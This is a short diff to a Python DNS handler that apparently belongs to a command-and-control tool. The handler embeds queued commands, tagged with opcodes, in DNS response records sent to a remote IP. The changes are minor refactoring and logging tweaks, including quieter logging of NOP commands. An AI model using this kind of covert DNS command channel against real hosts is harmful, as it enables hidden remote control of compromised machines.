@@ -1,6 +1,8 @@
 import dnslib
-from backend.handlers.protocolhandler import ProtocolHandler, Commands
+from backend.handlers.protocolhandler import ProtocolHandler
+from util.structs import CommandType
 from enum import Enum
+
 
 
 class Records(Enum):
@@ -29,7 +31,7 @@ class DNSHandler(ProtocolHandler):
                     self.latest_request_id = request.header.id
                     self._send_command(request, port, cmd)
         except dnslib.DNSError:
-            self.logger.info("Incorrectly formatted DNS Query. Skipping")
+            self.logger.debug("Incorrectly formatted DNS Query. Skipping")
 
     def _send_command(self, request, port, command):
         opcode = command.type
@@ -47,5 +49,8 @@ class DNSHandler(ProtocolHandler):
                 rdata=rr_constructor(f"<{opcode.value}>:{cmd}"),
                 ttl=1337))
         # send command
-        self.logger.info(f"Sending '{cmd}' to {self.ip}")
+        if opcode != CommandType.NOP:
+            self.logger.info(f"Sending '{cmd}' to {self.ip}")
+        else:
+            self.logger.debug(f"NOP sent to {self.ip}")
         self.socket.sendto(command_packet.pack(), (self.ip, port))
